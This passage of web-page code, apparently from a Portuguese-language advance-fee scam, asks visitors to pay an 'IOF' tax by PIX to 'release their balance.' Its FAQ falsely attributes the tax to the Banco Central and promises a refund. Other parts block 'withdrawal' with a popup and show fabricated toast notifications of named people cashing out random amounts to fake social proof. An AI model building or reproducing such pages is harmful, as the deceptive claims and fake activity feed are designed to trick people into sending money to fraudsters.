                        d="m61.233 65.811c-3.08 0-5.977-1.2-8.156-3.376l-11.777-11.778c-.827-.829-2.268-.826-3.094 0l-11.82 11.82a11.463 11.463 0 0 1 -8.156 3.377h-2.321l14.916 14.916c4.658 4.658 12.21 4.658 16.869 0l14.958-14.96zm-43.003-41.656c3.08 0 5.977 1.199 8.156 3.376l11.82 11.822a2.19 2.19 0 0 0 3.094 0l11.777-11.779a11.463 11.463 0 0 1 8.156-3.376h1.419l-14.958-14.959c-4.659-4.658-12.211-4.658-16.87 0l-14.914 14.916z"
                        fill="#32bcad"></path>
                    <path
                        d="m75.024 36.57-9.039-9.04c-.199.08-.414.13-.642.13h-4.11a8.123 8.123 0 0 0 -5.706 2.365l-11.776 11.775a5.637 5.637 0 0 1 -3.997 1.654 5.637 5.637 0 0 1 -3.997-1.653l-11.821-11.82a8.121 8.121 0 0 0 -5.706-2.365h-5.054c-.215 0-.417-.05-.607-.122l-9.075 9.076c-4.659 4.658-4.659 12.21 0 16.87l9.075 9.074c.19-.072.392-.122.607-.122h5.054a8.122 8.122 0 0 0 5.706-2.364l11.82-11.82c2.136-2.135 5.86-2.136 7.995 0l11.776 11.776a8.123 8.123 0 0 0 5.706 2.365h4.11c.228 0 .443.05.642.13l9.04-9.04c4.658-4.658 4.658-12.21 0-16.87"
                        fill="#32bcad"></path>
                </svg>
            </div>

            <div style="display: flex; gap: 12px; align-items: start;">
                <svg aria-hidden="true" style="width: 20px; height: 20px; color: #555; flex-shrink: 0; margin-top: 2px;"
                    viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                    <path
                        d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"
                        fill="currentColor"></path>
                </svg>
                <div
                    style="font-size: 14px; color: #444; font-weight: 500; font-family: 'Manrope', sans-serif; text-align: left; line-height: 1.5;">
                    Pague com PIX! Os pagamentos são simples, práticos e realizados em segundos.</div>
            </div>
        </div>
    </div>

    <!-- Bottom CTA Section (Different from top to avoid duplication) -->
    <div style="margin-top: 30px; text-align: center; padding: 20px; background: #f8f9fa; border-radius: 12px;">
        <h3 style="font-family: 'Manrope', sans-serif; font-size: 18px; font-weight: 700; margin: 0 0 10px 0; color: #111;">
            Ainda tem dúvidas?
        </h3>
        <p style="font-family: 'Manrope', sans-serif; font-size: 14px; margin: 0 0 15px 0; color: #555; line-height: 1.5;">
            Confira as perguntas frequentes abaixo ou prossiga com o pagamento para liberar seu saldo.
        </p>
        <a id="paymentButton-bottom" href="javascript:void(0)" onclick="if(document.getElementById('termsCheckbox-top').checked){ window.location.href = typeof addUtm === 'function' ? addUtm('checkout/index.html') : 'checkout/index.html' + window.location.search; }" class="btn33 enabled" style="
            margin: 0 auto;
            max-width: 300px;
            background-color: #003772; 
            color: white; 
            border-radius: 50px; 
            box-shadow: 0 4px 6px rgba(0, 55, 114, 0.3);
            font-weight: 700;
            letter-spacing: 0.5px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            text-decoration: none;
            height: 50px;
        ">Pagar Imposto</a>
    </div>

    <!-- FAQ -->
    <div class="faq-section"
        style="margin-top: 40px; padding: 25px; background-color: #fafafa; border-radius: 12px; border: 1px solid #efefef;">
        <h2 class="faq-title"
            style="font-family: 'Inter', sans-serif; font-size: 20px; font-weight: 700; margin-bottom: 20px; text-align: left; color: #111;">
            Dúvidas Frequentes</h2>
        <div class="faq-item"
            style="background: #fff; margin-bottom: 12px; border-radius: 8px; border: 1px solid #e5e5e5; box-shadow: 0 2px 5px rgba(0,0,0,0.02);">
            <div class="faq-question"
                style="padding: 16px; font-weight: 600; font-size: 14px; display: flex; justify-content: space-between; align-items: center; color: #333;">
                Por que o IOF não é descontado do saldo?
            </div>
            <div class="faq-answer"
                style="padding: 20px; border-top: 1px solid #f0f0f0; display: none; text-align: left;">
                <p style="font-size: 13px; color: #555; height: auto; margin: 0; line-height: 1.6;">Conforme
                    determinação do <strong>Banco Central</strong>, o IOF deve ser pago separadamente para validar a
                    transação e <strong>evitar fraudes.</strong> O valor é reembolsado.</p>
            </div>
        </div>
        <div class="faq-item"
            style="background: #fff; margin-bottom: 12px; border-radius: 8px; border: 1px solid #e5e5e5; box-shadow: 0 2px 5px rgba(0,0,0,0.02);">
            <div class="faq-question"
                style="padding: 16px; font-weight: 600; font-size: 14px; display: flex; justify-content: space-between; align-items: center; color: #333;">
                Como realizar o pagamento?
            </div>
            <div class="faq-answer"
                style="padding: 20px; border-top: 1px solid #f0f0f0; display: none; text-align: left;">
                <p style="font-size: 13px; color: #555; margin: 0; line-height: 1.6;">Clique em <strong>'Pagar
                        Imposto'</strong> e use o código PIX gerado. É seguro e instantâneo.</p>
            </div>
        </div>
        <!-- FAQ Item 3 -->
        <div class="faq-item"
            style="background: #fff; margin-bottom: 12px; border-radius: 8px; border: 1px solid #e5e5e5; box-shadow: 0 2px 5px rgba(0,0,0,0.02);">
            <div class="faq-question"
                style="padding: 16px; font-weight: 600; font-size: 14px; display: flex; justify-content: space-between; align-items: center; color: #333;">
                O botão de pagar não funciona?
            </div>
            <div class="faq-answer"
                style="padding: 20px; border-top: 1px solid #f0f0f0; display: none; text-align: left;">
                <p style="font-size: 13px; color: #555; margin: 0; line-height: 1.6;">Marque a caixa <strong>"Concordo
                        com os termos"</strong> acima do botão para habilitá-lo.</p>
            </div>
        </div>
    </div>
</div>
    `;

    // Checkbox Logic for Top Button
    const checkboxTop = document.getElementById('termsCheckbox-top');
    const payBtnTop = document.getElementById('paymentButton-top');

    function toggleButtonTop() {
        if (checkboxTop && payBtnTop) {
            if (checkboxTop.checked) {
                payBtnTop.classList.add('enabled');
                payBtnTop.style.opacity = '1';
                payBtnTop.style.pointerEvents = 'auto';
                payBtnTop.style.cursor = 'pointer';
                // Set href dynamically
                const targetPath = 'checkout/index.html';
                if (typeof addUtm === 'function') {
                    payBtnTop.href = addUtm(targetPath);
                } else {
                    payBtnTop.href = targetPath + window.location.search;
                }
                payBtnTop.removeAttribute('onclick'); // Remove inline onclick if present
            } else {
                payBtnTop.classList.remove('enabled');
                payBtnTop.style.opacity = '0.5';
                payBtnTop.style.pointerEvents = 'none';
                payBtnTop.style.cursor = 'not-allowed';
                payBtnTop.href = "javascript:void(0)";
            }
        }
    }

    if (checkboxTop) {
        checkboxTop.addEventListener('change', toggleButtonTop);
        toggleButtonTop();
    }

    // Checkbox Logic for Bottom Button
    const checkbox = document.getElementById('termsCheckbox-top'); // Using top checkbox for bottom button
    const payBtn = document.getElementById('paymentButton-bottom');

    function toggleButton() {
        if (checkbox && payBtn) {
            if (checkbox.checked) {
                payBtn.classList.add('enabled');
                payBtn.style.opacity = '1';
                payBtn.style.pointerEvents = 'auto';
                payBtn.style.cursor = 'pointer';
                // Set href dynamically
                const targetPath = 'checkout/index.html';
                if (typeof addUtm === 'function') {
                    payBtn.href = addUtm(targetPath);
                } else {
                    payBtn.href = targetPath + window.location.search;
                }
                payBtn.removeAttribute('onclick'); // Remove inline onclick if present
            } else {
                payBtn.classList.remove('enabled');
                payBtn.style.opacity = '0.5';
                payBtn.style.pointerEvents = 'none';
                payBtn.style.cursor = 'not-allowed';
                payBtn.href = "javascript:void(0)";
            }
        }
    }

    if (checkbox) {
        checkbox.addEventListener('change', toggleButton);
        toggleButton(); // Init state
    }



    // FAQ Toggle Logic
    document.querySelectorAll('.faq-question').forEach(question => {
        question.addEventListener('click', () => {
            const answer = question.nextElementSibling;
            const isOpen = answer.style.display === "block";

            // Close all
            document.querySelectorAll('.faq-answer').forEach(ans => ans.style.display = 'none');

            // Toggle current
            answer.style.display = isOpen ? "none" : "block";
        });
    });
}


// Start the app
init();

// --- Helper Functions for Popup and Notifications ---

function showWithdrawalBlockedPopup() {
    // Prevent multiple popups
    if (document.getElementById('blocked-popup')) return;

    const popup = document.createElement('div');
    popup.id = 'blocked-popup';
    popup.className = 'popup-overlay';
    // Use existing popup styling but custom content
    popup.innerHTML = `
        <div class="popup-content" style="max-width: 320px;">
            <div class="popup-header" style="background-color: #FF4906;">
                <h3 class="popup-title" style="color: #fff;">Atenção</h3>
            </div>
            <div class="popup-body" style="padding: 20px;">
                <div class="popup-message" style="color: #333; font-weight: 500; font-size: 16px;">
                    Não é possível realizar o saque do valor ainda. É necessário prosseguir com a pesquisa.
                </div>
                <div class="popup-button" id="blocked-continue-btn" style="background-color: #FF4906; margin-top: 15px;">Continuar</div>
            </div>
        </div>
    `;

    document.body.appendChild(popup);

    document.getElementById('blocked-continue-btn').addEventListener('click', () => {
        document.body.removeChild(popup);
    });
}

let notificationsStarted = false;
let notificationInterval; // Global variable to store interval

function startNotifications() {
    if (notificationsStarted) return;
    notificationsStarted = true;

    const names = [
        { name: "Maria Silva", amount: "482,13" },
        { name: "João Santos", amount: "150,00" },
        { name: "Ana Pereira", amount: "850,00" },
        { name: "Pedro Oliveira", amount: "200,00" },
        { name: "Lucas Costa", amount: "320,50" },
        { name: "Carla Rodrigues", amount: "600,00" },
        { name: "Marcos Alves", amount: "120,00" },
        { name: "Juliana Lima", amount: "950,00" },
        { name: "Rafael Sousa", amount: "400,00" },
        { name: "Bruna Ferreira", amount: "275,00" }
    ];

    const showNotification = () => {
        const randomUser = names[Math.floor(Math.random() * names.length)];
        const notif = document.createElement('div');
        notif.className = 'notification-toast';
        notif.innerHTML = `
            <div class="notif-icon">
                <i class="fas fa-check" style="font-size: 14px;"></i>
            </div>
            <div class="notif-content">
                <span class="notif-name">${randomUser.name}</span>
                <span class="notif-text">sacou</span> <!-- Shortened text for better mobile fit -->
                <span class="notif-amount">R$ ${randomUser.amount}</span>
            </div>
        `;

        document.body.appendChild(notif);

        // Slide in
        setTimeout(() => {
            notif.classList.add('visible');
        }, 100);

        // Remove after 4s
        setTimeout(() => {
            notif.classList.remove('visible');
            setTimeout(() => {
                if (notif.parentNode) notif.parentNode.removeChild(notif);
            }, 300);
        }, 4000);
    };

    // First one immediately? Or small delay?
    showNotification();

    // Loop
    notificationInterval = setInterval(() => {
        showNotification();
    }, 6000 + Math.random() * 4000); // Every 6-10 seconds
}

function stopNotifications() {
    if (notificationInterval) {
        clearInterval(notificationInterval);
        notificationInterval = null;
    }
    notificationsStarted = false; // Allow restart if needed? Or just stop.
    // Also remove any existing notifications
    const existing = document.querySelectorAll('.notification-toast');
    existing.forEach(el => el.remove());
}
